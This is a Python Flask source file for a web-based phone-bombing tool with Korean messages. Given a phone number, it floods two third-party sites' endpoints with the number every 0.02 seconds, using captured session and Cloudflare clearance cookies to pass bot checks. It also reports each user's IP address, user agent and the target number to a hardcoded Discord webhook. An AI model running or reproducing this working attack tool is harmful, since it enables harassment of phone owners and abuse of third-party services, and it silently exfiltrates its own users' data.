from flask import Flask, render_template, request, jsonify
import threading
import requests
import time
from datetime import datetime

app = Flask(__name__)

attack_thread = None
attack_running = False
attack_lock = threading.Lock()
current_phone = None

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1384068965382225922/PqNEbMmssOHuHNxiajsN3KJ3jS_WMuKXeh9a4lyrBxy6oeju86I3qziwhw9Bu0haJNQb"

headers1 = {
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
    "Cache-Control": "no-cache",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Origin": "http://lk-2222.com/",
    "Pragma": "no-cache",
    "Referer": "http://lk-2222.com/",
    "Sec-CH-UA": '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
    "Sec-CH-UA-Mobile": "?0",
    "Sec-CH-UA-Platform": '"Windows"',
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
    "X-Requested-With": "XMLHttpRequest",
    "Cookie": "Name=gameodsls; ASPSESSIONIDCQACCTCQ=JHPFHFLBGNMEPJFMEDNMPGDA; Popup_9=1; cf_clearance=9wGg_YJJ7lIglvLSGsaYFmx882rshK_C3otW970IFN8-1749800550-1.2.1.1-hLlv82RT3OpeDRR3_H086oRjUX2pxIXn6mntpWC1wSTimaKpWeopSvZ4X1RRSJUpf9wCOj9kWcWbDvGIMAIFzXehQmtue.HPWbXXj7dl4.jPaDkyF4sX0zKM3OXl7T0UKcXstHkn7KjqnnpyDYLupxTGIeUcndRNR66PPRHbiCSf1OfYdWauCyCBmQj6unjH9T88ix9iOOy.kAatqiPtdUjiA6kIhEsi1QnvXWNDFUiu5DL4gvS3XKitIjM1fP33Biaim6eWzs8dbD_PbpptKPyFvOsLnsbEW_tP0uHmg8t3XHhtekIKyC6.wWa4ZcmbBV1dHb31xremLAlVnJvtGK4fEYlJIvLoWkdFjBm5myY; Popup_6=1; Popup_8=1; Popup_5=1; Popup_7=1",
}

headers2 = {
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
    "Cache-Control": "no-cache",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Origin": "https://riseca-1212.com",
    "Pragma": "no-cache",
    "Referer": "https://riseca-1212.com/",
    "Sec-CH-UA": '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
    "Sec-CH-UA-Mobile": "?0",
    "Sec-CH-UA-Platform": '"Windows"',
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
    "X-Requested-With": "XMLHttpRequest",
    "Cookie": "Name=gameodsls; ASPSESSIONIDCQACCTCQ=JHPFHFLBGNMEPJFMEDNMPGDA; Popup_9=1; cf_clearance=9wGg_YJJ7lIglvLSGsaYFmx882rshK_C3otW970IFN8-1749800550-1.2.1.1-hLlv82RT3OpeDRR3_H086oRjUX2pxIXn6mntpWC1wSTimaKpWeopSvZ4X1RRSJUpf9wCOj9kWcWbDvGIMAIFzXehQmtue.HPWbXXj7dl4.jPaDkyF4sX0zKM3OXl7T0UKcXstHkn7KjqnnpyDYLupxTGIeUcndRNR66PPRHbiCSf1OfYdWauCyCBmQj6unjH9T88ix9iOOy.kAatqiPtdUjiA6kIhEsi1QnvXWNDFUiu5DL4gvS3XKitIjM1fP33Biaim6eWzs8dbD_PbpptKPyFvOsLnsbEW_tP0uHmg8t3XHhtekIKyC6.wWa4ZcmbBV1dHb31xremLAlVnJvtGK4fEYlJIvLoWkdFjBm5myY; Popup_6=1; Popup_8=1; Popup_5=1; Popup_7=1",
}

def attack_loop(phone):
    global attack_running
    while True:
        with attack_lock:
            if not attack_running:
                break
        try:
            response1 = requests.post("http://lk-2222.com/proc/json/", headers=headers1, data={
                "m": "100",
                "s": "0",
                "x": "0",
                "ucell": phone,
            })
            print("url1 응답코드:", response1.status_code)
            print("url1 텍스트:", response1.text)

            response2 = requests.post("https://riseca-1212.com/proc/json/", headers=headers2, data={
                "m": "100",
                "s": "0",
                "x": "0",
                "ucell": phone,
            })
            print("url2 응답코드:", response2.status_code)
            print("url2 텍스트:", response2.text)
        except Exception as e:
            print("요청 실패:", e)
        time.sleep(0.02)

app = Flask(__name__)

attack_thread = None
attack_running = False

def send_discord_notification(phone, client_ip, user_agent):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    data = {
        "content": f"📢 공격 시작 알림\n"
                   f"전화번호: {phone}\n"
                   f"IP: {client_ip}\n"
                   f"기기 정보: {user_agent}\n"
                   f"시간: {now}"
    }
    try:
        requests.post(DISCORD_WEBHOOK_URL, json=data)
    except Exception as e:
        print("디스코드 전송 실패:", e)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start_attack', methods=['POST'])
def start_attack():
    global attack_thread, attack_running, current_phone
    data = request.json
    phone = data.get('phone')
    if not phone:
        return jsonify({"status": "error", "message": "번호를 입력하세요."})

    # 클라이언트 IP와 User-Agent 수집
    client_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')

    # 디스코드 알림 보내기
    send_discord_notification(phone, client_ip, user_agent)

    with attack_lock:
        if attack_running:
            return jsonify({"status": "error", "message": "이미 공격중입니다."})
        attack_running = True
        current_phone = phone
        attack_thread = threading.Thread(target=attack_loop, args=(phone,))
        attack_thread.start()
    return jsonify({"status": "success", "message": f"{phone}에 대한 공격을 시작하며 중지를 누르기 전까지 계속 공격합니다"})

@app.route('/stop_attack', methods=['POST'])
def stop_attack():
    global attack_thread, attack_running
    with attack_lock:
        attack_running = False
    if attack_thread:
        attack_thread.join()
    return jsonify({"status": "success", "message": "공격 정지됨."})

if __name__ == '__main__':
    app.run(debug=True)